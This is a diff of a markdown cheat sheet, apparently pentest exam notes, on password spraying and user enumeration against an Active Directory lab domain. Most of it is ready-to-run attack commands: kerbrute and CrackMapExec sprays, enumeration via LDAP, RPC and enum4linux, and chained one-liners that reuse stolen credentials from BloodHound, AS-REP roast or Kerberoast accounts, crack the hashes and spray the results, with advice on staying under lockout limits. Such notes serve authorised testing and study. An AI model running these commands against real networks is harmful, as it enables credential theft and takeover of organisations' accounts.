-#### METHOD 2: Kerberos TGT-Based Spray (kerbrute)
-*Ports: 88 | Noise: LOW*
+Ports: 88 | Noise: LOW
 
 ```bash
 kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Strawberry1'
-kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Flowers1'
-kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'HomeTaping199!'
 ```
+```bash
+kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Flowers1'
+```
+- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
+- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only
 
-- **+** Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
-- **-** No admin check (just validates creds), requires valid userlist, Kerberos only
+#### Method 3: LDAP/ADSI-Based Spray (PowerShell)
 
-#### METHOD 3: LDAP/ADSI-Based Spray (PowerShell)
-*Ports: 389, 636 | Noise: MEDIUM*
+Ports: 389, 636 | Noise: MEDIUM
 
 ```bash
 Invoke-DomainPasswordSpray -UserList users.txt -Password 'Strawberry1' -Verbose
 ```
-
-- **+** Built into Windows - no external tools needed, uses native APIs, scriptable
-- **-** Windows-only, slower than Kerberos, requires PowerShell access on target
-
-### User List Generation
-
-**From Linux (Kali):**
-
 ```bash
-# Enumerate valid users via Kerberos pre-auth
+Invoke-DomainPasswordSpray -UserList users.txt -Password 'Flowers1' -Verbose
+```
+- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
+- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target
+
+### User Enumeration
+
+**Enumerate valid users via Kerberos pre-auth**
+```bash
 kerbrute userenum -d corp.com --dc 192.168.249.70 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
 ```
 
+**LDAP enumeration with credentials**
 ```bash
-# CME user enumeration (authenticated)
-crackmapexec smb 192.168.249.70 -u 'IIS_SERVICE' -p 'Strawberry1' -d corp.com --users | awk '{print $5}' | grep -v '\[' > users.txt
+ldapsearch -x -H ldap://192.168.249.70 -D 'corp.com\IIS_SERVICE' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
 ```
 
+**CME user enumeration (authenticated)**
 ```bash
-# Export users from BloodHound Neo4j (clean output)
+crackmapexec smb 192.168.249.70 -u 'IIS_SERVICE' -p '<PASSWORD>' -d corp.com --users | awk '{print $5}' | grep -v '\[' > users.txt
+```
+
+**Export users from BloodHound Neo4j (clean output)**
+```bash
 echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
 ```
 
-**From Windows (on target):**
-
-```powershell
-# Export domain users to file
-net user /domain > users.txt
+**RPC user enumeration**
+```bash
+rpcclient -U 'IIS_SERVICE%<PASSWORD>' 192.168.249.70 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
 ```
 
-```powershell
-# PowerShell AD enumeration (requires RSAT)
-Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > users.txt
+**enum4linux user enumeration (unauthenticated if allowed)**
+```bash
+enum4linux -U 192.168.249.70 | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
 ```
 
-### Scenario Recommendations
+### Spray One-Liners
 
-| Scenario | Method | Reason |
-|----------|--------|--------|
-| Stealth required (avoid detection) | **kerberos** | Kerbrute doesn't generate Windows Event Logs for failed auth |
-| Need to identify admin access | **smb** | CME shows (Pwn3d!) for admin access, validates + checks in one step |
-| Large user list (1000+ users) | **kerberos** | Fastest option - only 2 UDP frames per attempt |
-| Windows-only environment (no tool transfer) | **ldap** | Uses built-in PowerShell, no binary transfer needed |
-| Strict lockout policy (threshold <= 3) | **kerberos** | Pre-auth check identifies invalid users without incrementing lockout counter |
-| Need to spray entire subnet | **smb** | CME supports CIDR ranges, shows which hosts are accessible |
+**1. Full Neo4j Spray (Stealth)**
+_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
+```bash
+echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d corp.com --dc 192.168.249.70 targets.txt "$p"; sleep 1800; done
+```
 
-### Quick Reference
+**2. Neo4j Spray + Admin Check (CME)**
+_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
+```bash
+echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb 192.168.249.70 -u targets.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
+```
 
-| Method | Noise | Speed | Admin Check |
-|--------|-------|-------|-------------|
-| SMB (CME) | HIGH | Medium | YES |
-| Kerberos | LOW | Fast | No |
-| LDAP/ADSI | MEDIUM | Slow | No |
+**3. AS-REP Roast → Crack → Spray**
+_Roast AS-REP users, crack hashes, spray cracked passwords_
+```bash
+impacket-GetNPUsers -dc-ip 192.168.249.70 -request -outputfile asrep.txt corp.com/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.249.70 -u users.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
+```
 
-> **EXAM TIP:** Before spraying, always check `net accounts` to verify lockout.
-> With 5-attempt lockout, safely attempt 4 passwords per 30 min window.
+**4. Kerberoast → Crack → Spray**
+_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
+```bash
+impacket-GetUserSPNs -dc-ip 192.168.249.70 -request -outputfile kerberoast.txt 'corp.com/IIS_SERVICE:Strawberry1' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.249.70 -u users.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
+```
+
+**5. CeWL → Mutate → Spray**
+_Generate wordlist from website, apply mutations, spray_
+```bash
+cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt spray_passwords.txt
+```
+
+> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
